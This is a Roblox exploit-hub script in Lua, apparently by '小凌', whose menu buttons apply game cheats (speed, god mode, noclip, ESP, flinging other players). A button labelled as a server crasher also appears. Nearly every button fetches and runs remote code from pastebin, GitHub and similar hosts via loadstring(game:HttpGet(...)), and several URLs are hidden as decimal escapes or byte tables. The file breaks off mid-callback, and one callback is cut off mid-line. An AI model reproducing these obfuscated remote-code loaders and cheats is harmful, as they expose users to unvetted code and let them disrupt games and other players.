local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "小凌脚本-Beta",
    Text = "Longing....反挂机已开启",
    Duration = 5, 
})
print("反挂机")
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/SePpsSPZ'))()
local Window = OrionLib:MakeWindow({Name = "小凌脚本-Beta", HidePremium = false, SaveConfig = true,IntroText = "你好！", ConfigFolder = "欢迎使用"})
local about = Window:MakeTab({
    Name = "小凌ExecuteV1",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

about:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
about:AddParagraph("您的注入器:"," "..identifyexecutor().."")
about:AddParagraph("您当前服务器的ID"," "..game.GameId.."")
local Tab = Window:MakeTab({
  Name = "通用",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  
 Tab:AddButton({
	Name = "K1S脚本",
	Callback = function()
getgenv().LS="k1s"
loadstring(game:HttpGet("https://pastebin.com/raw/DCGzQ6iY"))
end
})

Tab:AddButton({
	Name = "飞行装备（可控制物体）",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/zaochuan2"))()		
  	end
})

Tab:AddTextbox({
	Name = "移动速度",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end	 
})

 Tab:AddTextbox({
	Name = "跳跃高度",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end	 
})

Tab:AddTextbox({
	Name = "最大血量",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.MaxHealth = Value
	end	 
})

Tab:AddTextbox({
	Name = "当前血量",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.Health = Value
	end	 
})

Tab:AddButton({
	Name = "回满血",
	Callback = function()
game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.MaxHealth 
end
})

Tab:AddTextbox({
	Name = "重力设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Workspace.Gravity = Value
	end
})

Tab:AddButton({
	Name = "Acrylix（通用）",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/3dsonsuce/acrylix/main/Acrylix'))()
end
})

Tab:AddButton({
	Name = "修改玩家碰撞箱",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/JYFXjEVh'))()
end
})

Tab:AddButton({
	Name = "墙行走",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end
})

Tab:AddToggle({
	Name = "夜视",
	Default = false,
	Callback = function(Value)
		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
	end
})

Tab:AddButton({
	Name = "通用ESP",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
	end
})

Tab:AddButton({
	Name = "电脑键盘",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
  	end    
})

Tab:AddToggle({
	Name = "穿墙",
	Default = false,
	Callback = function(Value)
		if Value then
		    Noclip = true
		    Stepped = game.RunService.Stepped:Connect(function()
			    if Noclip == true then
				    for a, b in pairs(game.Workspace:GetChildren()) do
                        if b.Name == game.Players.LocalPlayer.Name then
                            for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                    end
			    else
				    Stepped:Disconnect()
			    end
		    end)
	    else
		    Noclip = false
	    end
	end
})

Tab:AddButton({
	Name = "甩飞别人",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/GnvPVBEi"))()
  	end    
})

Tab:AddButton({
	Name = "转圈fling GUI",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
end
})

Tab:AddButton({
  Name = "加速回血",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/nengliangtiao"))()
  end
})

Tab:AddButton({
    Name="我要紫砂",
    Callback=function()
        game.Players.LocalPlayer.Character.Humanoid.Health=0
HumanDied = true
    end
})

Tab:AddButton({
	Name = "不死但不完全不死（点紫砂去除）",
	Callback = function()
HumanDied = false
end
})

Tab:AddButton({
	Name = "跟踪玩家",
	Callback = function()
      	loadstring(game:HttpGet("https://pastebin.com/raw/F9PNLcXk"))()
  	end
})

Tab:AddButton({
	Name = "伪名说话",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.ga/zCFEwaYq/raw'),true))()
	end 
})

Tab:AddButton({
	Name = "人物无敌",
	Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/H3RLCWWZ'))()
	end    
})

Tab:AddButton({
	Name = "无敌",
	Callback = function()
local lp = game:GetService "Players".LocalPlayer
if lp.Character:FindFirstChild "Head" then
    local char = lp.Character
    char.Archivable = true
    local new = char:Clone()
    new.Parent = workspace
    lp.Character = new
    wait(2)
    local oldhum = char:FindFirstChildWhichIsA "Humanoid"
    local newhum = oldhum:Clone()
    newhum.Parent = char
    newhum.RequiresNeck = false
    oldhum.Parent = nil
    wait(2)
    lp.Character = char
    new:Destroy()
    wait(1)
    newhum:GetPropertyChangedSignal("Health"):Connect(
        function()
            if newhum.Health <= 0 then
                oldhum.Parent = lp.Character
                wait(1)
                oldhum:Destroy()
            end
        end)
    workspace.CurrentCamera.CameraSubject = char
    if char:FindFirstChild "Animate" then
        char.Animate.Disabled = true
        wait(.1)
        char.Animate.Disabled = false
    end
    lp.Character:FindFirstChild "Head":Destroy()
end
end
})

Tab:AddButton({
	Name = "点击传送工具",
	Callback = function()
mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "点击传送鸭" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
	end
})

Tab:AddButton({
	Name = "Dex",
	Callback = function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
end
})

local Tab = Window:MakeTab({
  Name = "极速传奇",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  
  Tab:AddButton({
	Name = "极速传奇",
	Callback = function()
      	loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\111\121\115\99\112\47\98\101\116\97\47\109\97\105\110\47\37\69\57\37\56\48\37\57\70\37\69\53\37\66\65\37\65\54\37\69\55\37\56\50\37\66\56\37\69\56\37\66\53\37\66\55\46\108\117\97'))()
  	end
})

local Tab = Window:MakeTab({
  Name = "脚本中心",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  
Tab:AddButton({
	Name = "脚本中心",
	Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/De4aYHDY"))()
  	end
})

local Tab = Window:MakeTab({
	Name = "DOORS",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "神光脚本",
	Callback = function()

  _G["神光脚本作者TA"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,109,119,48,112,102,69,70,77})end)())))()--神光
    end
})

Tab:AddButton({
	Name = "面包脚本",
	Callback = function()

  _G["面包脚本作者TA"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,109,119,48,112,102,69,70,77})end)())))()--神光
    end
})

Tab:AddButton({
	Name = "Ohio doors",
	Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rxn-xyz/Ohio./main/Ohio.lua",true))()
    end
})

Tab:AddButton({
	Name = "云doors",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/hsjakajaaa.lua"))()
    end
})

Tab:AddButton({
	Name = "吸铁石",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/MagnetByNerd.lua"))()
    end
})
Tab:AddButton({
	Name = "剪刀",
	Callback = function()
   
loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/shears_done.lua"))()
    end
})    
Tab:AddButton({
	Name = "激光枪",
	Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Laser%20Gun"))()
    end
})
Tab:AddButton({
	Name = "夜视仪",
	Callback = function()
   
  _G.OnShop = trueloadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
    end
})    

Tab:AddButton({
	Name = "最强",
	Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/R8QMbhzv'))()
  	end    
})

Tab:AddButton({
	Name = "十字架",
	Callback = function()
   
loadstring(game:HttpGet('https://pastebin.com/raw/ibbWwU6q'))()
  	end
})
Tab:AddButton({
	Name = "能量罐（清岩提供）",
	Callback = function()  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/nengliangtiao"))()
    end
})   

Tab:AddButton({
	Name = "紫色手电筒（在电梯购买东西的时候使用）",
	Callback = function()
   
  loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Purple%20Flashlight"))()
    end
})  
local Tab = Window:MakeTab({
  Name = "国王遗产",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })

Tab:AddButton({
	Name = "trick",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_one"))()
end
})

Tab:AddButton({
	Name = "ipper hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20Leagacy"))()
end
})

Tab:AddButton({
	Name = "Xenon Hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/legacy"))()
end
})

Tab:AddButton({
	Name = "lack",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.lua"))()
end
})

Tab:AddButton({
	Name = "yper hub",
	Callback = function()
repeat wait() until game:IsLoaded()loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/Hyper/main/script.lua"))() 
end
})

local Tab = Window:MakeTab({
	Name = "脚本区",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "青蛙",
	Callback = function()
   
getgenv().eom = "青蛙"
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\122\120\115\81\82\68\85\39\41\41\40\41")()
    end
})
Tab:AddButton({
	Name = "地岩",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\98\97\109\120\98\98\97\109\120\98\98\97\109\120\47\99\111\100\101\115\112\97\99\101\115\45\98\108\97\110\107\47\109\97\105\110\47\37\69\55\37\57\57\37\66\68\34\41\41\40\41")()
    end
})
Tab:AddButton({
	Name = "ato",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/atoyayaya/jiaoben/main/jiamilist"))()
end
})
Tab:AddButton({
	Name = "龙",
	Callback = function()
loadstring(game:HttpGet "https://pastebin.com/raw/bXApbsu8")()
    end
})
Tab:AddButton({
	Name = "云脚本",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/Xiaos______________________________________________________________Yun__________________________________________________________________________betaV2.3------------------------------------------------------------------------------------jsjalololololololololololololololololololllololol.lua"))()
    end
})
Tab:AddButton({
  Name = "USA（卡密：USA AER）",
  Callback = function()
    getgenv().USA="作者莫羽免费请勿倒卖"loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/USA.lua"))()
   end
})local Tab = Window:MakeTab({
	Name = "脚本大全",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "自动刷金条(造船寻宝)",	
Callback = function()	loadstring(game:HttpGet("https://pastebin.com/raw/Lyy77rnr",true))()
  	end
})
Tab:AddButton({
	Name = "巴掌模拟器",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Unknownkellymc1/Unknownscripts/main/slap-battles')))()
    end
})

Tab:AddButton({
	Name = "Slap Battles fanmode（无冷却）",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/C6wNFT0r"))()
end
})

Tab:AddButton({
	Name = "Blox Fruit",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Frerfgzz/free-script/main/SMZHUBv2BETA"))()
end
})

Tab:AddButton({
	Name = "一路向西",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pHN96bvq"))()
end
})

Tab:AddButton({
	Name = "力量传奇",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/Muscle%20Legend"))()
  	end    
})

Tab:AddButton({
	Name = "The Mimic",
	Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/UPDATE-The-Mimic-Instant-Finish-Nightmare-Normal-TWT-And-Halloween-Trials-6497"))()
end
})

Tab:AddButton({
	Name = "The Mimic auto win",
	Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/NIGHTMARE-The-Mimic-Complete-Chapters-1687"))()
end
})

local Tab = Window:MakeTab({
  Name = "鲨口求生2",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  
Tab:AddDropdown({
	Name = "选择你的免费船(鲨2)",
	Default = "1",
	Options = {"无", "DuckyBoatBeta", "DuckyBoat", "BlueCanopyMotorboat", "BlueWoodenMotorboat", "UnicornBoat", "Jetski", "RedMarlin", "Sloop", "TugBoat", "SmallDinghyMotorboat", "JetskiDonut", "Marlin", "TubeBoat", "FishingBoat", "VikingShip", "SmallWoodenSailboat", "RedCanopyMotorboat", "Catamaran", "CombatBoat", "TourBoat", "Duckmarine", "PartyBoat", "MilitarySubmarine", "GingerbreadSteamBoat", "Sleigh2022", "Snowmobile", "CruiseShip"},
	Callback = function(Value)
local ohString1 = (Value)
game:GetService("ReplicatedStorage").EventsFolder.BoatSelection.UpdateHostBoat:FireServer(ohString1)
	end 
})
Tab:AddButton({
	Name = "自动杀鲨鱼（鲨2）",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Misc%20Scripts/sharkbite2.lua",true))()
  	end    
})

local Tab = Window:MakeTab({
  Name = "好玩的",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })

Tab:AddButton({
	Name = "非常好玩千万别点",
	Callback = function()
game.Players.LocalPlayer:Kick('都说了太好玩了')
end
})

local Tab = Window:MakeTab({
    Name = "监狱人生",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "Moon Hub",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/Gae7YC84"))();
  	end    
})

Tab:AddButton({
	Name = "菜单",
	Callback = function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/LiverMods/xRawnder/main/HubMoblie'))()
  	end    
})

Tab:AddButton({
	Name = "PRISONWARE_V1.3",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();
  	end    
})

Tab:AddButton({
	Name = "PRISONWARE V1.5",
	Callback = function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
	end
})

local Tab = Window:MakeTab({
  Name = "脚本大全2",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  
Tab:AddButton({
	Name = "动感星期五",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
  	end    
})

Tab:AddButton({
	Name = "战斗勇士",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))()
	end
})
Tab:AddButton({
	Name = "强壮传奇",
	Callback = function()
loadstring(game:HttpGet('https://ghostbin.co/paste/ctpa/raw'))()
	end
})

Tab:AddButton({
	Name = "进击的僵尸",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Zombie%20Attack", true))()
	end
})

Tab:AddButton({
	Name = "宠物模拟器X",
	Callback = function()
     loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
  	end    
})
Tab:AddButton({
	Name = "蜂群模拟器",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/3A61hnGA", true))()
  	end    
})
Tab:AddButton({
	Name = "Evade",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Evade/main.lua"))()
  	end    
})
Tab:AddButton({
	Name = "后室",
	Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/Gsqd40fL'))()
  	end    
})
Tab:AddButton({
	Name = "Synapse X",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))()
  	end    
})
Tab:AddButton({
	Name = "彩虹朋友",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Rainbow-Friends/main/Rainbow%20Friends"))()
  	end    
})
Tab:AddButton({
	Name = "HoHo blox fruit",
	Callback = function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
  	end    
})

local player = Window:MakeTab({
	Name = "能力大战",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

player:AddButton({ 
	Name = "能力大战（会覆盖）",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/abilitywars/main/Protected%20(29).lua"))()
  	end
})

local player = Window:MakeTab({
	Name = "Piggy",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

player:AddButton({ 
	Name = "Piggy（恐怖佩奇）",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0piggy2", true))()
  	end
})

local player = Window:MakeTab({
	Name = "视觉",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

player:AddButton({ 
	Name = "动态模糊",
	Callback = function()
       	local camera = workspace.CurrentCamera
local blurAmount = 10
local blurAmplifier = 5
local lastVector = camera.CFrame.LookVector

local motionBlur = Instance.new("BlurEffect", camera)

local runService = game:GetService("RunService")

workspace.Changed:Connect(function(property)
 if property == "CurrentCamera" then
  print("Changed")
  local camera = workspace.CurrentCamera
  if motionBlur and motionBlur.Parent then
   motionBlur.Parent = camera
  else
   motionBlur = Instance.new("BlurEffect", camera)
  end
 end
end)

runService.Heartbeat:Connect(function()
 if not motionBlur or motionBlur.Parent == nil then
  motionBlur = Instance.new("BlurEffect", camera)
 end
 
 local magnitude = (camera.CFrame.LookVector - lastVector).magnitude
 motionBlur.Size = math.abs(magnitude)*blurAmount*blurAmplifier/2
 lastVector = camera.CFrame.LookVector
end)
  	end
})

player:AddButton({ 
	Name = "光影（浅）",
	Callback = function()
       	loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()
  	end
})

player:AddButton({ 
	Name = "光影（深）",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
  	end
})

local Tab = Window:MakeTab({
	Name = "RobloxUI",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "新的moon让画面变得更流畅",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Empire4946/Mightix/main/loader.lua",true))()
  	end
})

Tab:AddButton({
	Name = "red界面",
	Callback = function()
     loadstring(game:HttpGet("https://eternityhub.xyz/BetterRoblox/Loader"))()
  	end
})

local Tab = Window:MakeTab({
    Name = "伐木脚本",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
      Name = "小云bark2.0",
      Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/bark2.0.lua"))()
      end
      })

local Tab = Window:MakeTab({
	Name = "通用2",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({	
Name = "工具包",	
Callback = function()	loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()	  	
     end
})
Tab:AddButton({
	Name = "透视",
	Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/MA8jhPWT'))()
  	end    
})
Tab:AddButton({
	Name = "飞车",
	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbWF"))()
	end
})
Tab:AddButton({
	Name = "甩飞",
	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/GnvPVBEi"))()
	end
})
Tab:AddButton({
	Name = "无限跳",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
    end
})

Tab:AddButton({
      Name = "阿尔宙斯V3.0 UI",
      Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
      end
})

Tab:AddButton({
  Name = "光影_2",
  Default = false,
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
  end
})

Tab:AddButton({
  Name = "美丽天空",
  Callback = function()
    -- Roblox Graphics Enhancher
    local light = game.Lighting
    for i, v in pairs(light:GetChildren()) do
      v:Destroy()
    end

    local ter = workspace.Terrain
    local color = Instance.new("ColorCorrectionEffect")
    local bloom = Instance.new("BloomEffect")
    local sun = Instance.new("SunRaysEffect")
    local blur = Inst
  end
})

Tab:AddButton({
	Name = "超高画质",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()
end
})    

local Tab = Window:MakeTab({
	Name = "FE脚本",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "C00lgui",
	Callback = function()
   loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
  	end    
})
Tab:AddButton({
	Name = "1x1x1x1",
	Callback = function()
     loadstring(game:HttpGet(('https://pastebin.com/raw/JipYNCht'),true))()
  	end    
})
Tab:AddButton({
	Name = "变玩家（R6）",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/XR4sGcgJ"))()
  	end    
})
Tab:AddButton({
	Name = "动画中心",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
  	end    
})

local Tab = Window:MakeTab({
  Name = "FE变身脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })

Tab:AddButton({
	Name = "FE SANS",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/i0yEjAry"))()
end
})

Tab:AddButton({
	Name = "FE Reaper",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/5rVDct9n"))()
end
})

Tab:AddButton({
	Name = "FE死侍",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/NVvdEySK"))()
end
})

Tab:AddButton({
	Name = "FE Knife",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/uAnpMVZR"))()
end
})

Tab:AddButton({
	Name = "Void BOSS",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/uP0MV6As"))()
end
})

Tab:AddButton({
	Name = "变大变小真的奇妙～",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/yRyNgpGE"))()
end
})

Tab:AddButton({
	Name = "FE PUNCH",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/gBrRFj8K"))()
end
})

Tab:AddButton({
	Name = "FE DEATH",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/sUcgGXkC"))()
end
})

Tab:AddButton({
	Name = "炸服（不要问我为什么加到这）",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/eU2wngHG"))()
end
})

Tab:AddButton({
	Name = "FE Giant AXE",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.ga/lrjtanrp/raw'),true))()
end
})

Tab:AddButton({
	Name = "FE Saitama",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/HgbE1e6E"))()
end
})

Tab:AddButton({
	Name = "FE giant eye",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/nXEnZrdH"))()
end
})

Tab:AddButton({
	Name = "FE帅气小刀刀",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/PTQQGkYG"))()
end
})

Tab:AddButton({
	Name = "FE月亮之刃",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/rTSxZGSQ"))()
end
})

Tab:AddButton({
	Name = "Among us（逆天）",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/f1LTmTPZ"))()
end
})

local Tab = Window:MakeTab({
  Name = "私人定制脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })

Tab:AddButton({
	Name = "tagu定制",
	Callback = function()
end
})

Tab:AddButton({
	Name = "电脑专用Evade",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/9Strew/roblox/main/gamescripts/evade.lua'))()
end
})

Tab:AddButton({
	Name = "手机电脑通用Evade",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
end
})

local Tab = Window:MakeTab({
	Name = "doors2",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "脚本doors",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/whXp1Ca2"))()
  	end    
})

local Tab = Window:MakeTab({
  Name = "DOORS娱乐十字架(只对自己召唤的怪有用)",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
})
Tab:AddButton({
  Name = "刷怪菜单",
  Callback = function ()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shuaguai"))()
  end
})
Tab:AddButton({
	Name = "DOORS变身脚本",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
end
}) 
Tab:AddButton({
  Name = "耶稣十字架",
  Callback = function ()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi2"))()
  end
})
Tab:AddButton({
  Name = "紫光十字架",
  Callback = function ()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi3"))()
  end
})
Tab:AddButton({
  Name = "万圣节十字架",
  Callback = function ()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi4"))()
  end
})
Tab:AddButton({
  Name = "普通十字架",
  Callback = function ()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizizhen"))()
  end
})

local Tab = Window:MakeTab({	Name = "关于",	Icon = "rbxassetid://7734068321",	PremiumOnly = false})
Tab:AddButton({
	Name = "复制小凌qq",
	Callback = function()
	setclipboard("1211373508")
end
})
Tab:AddButton({
	Name = "群号",
	Callback = function()
	setclipboard("1211373508")
end
})
Tab:AddButton({
	Name = "公告",
	Callback = function()
end
})
Tab:AddParagraph("制作：小凌")
Tab:AddParagraph("Xiao_Ling")
Tab:AddParagraph("谢谢群里的《你猜 喵~》帮我测试")
Tab:AddParagraph("《一根葱是一个furry!!!》")
Tab:AddParagraph("UI:Krx群")
Tab:AddParagraph("缝合大佬小凌")
Tab:AddParagraph("QB脚本作者对不起我不该骂你！！！")
Tab:AddParagraph("退休对不起我不该开源的")
Tab:AddButton({
	Name = "小凌💓",
	Callback = function()
end
})
Tab:AddButton({
	Name = "⭐凌⭐",
	Callback = function()
end
})
Tab:AddButton({
  Name = "HB中心",
  Callback = function ()
    loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,82,66,119,107,107,117,55,49})end)())))()
    
  end
})
Tab:AddButton({
  Name = "kinghub 汉化",
  Callback = function ()
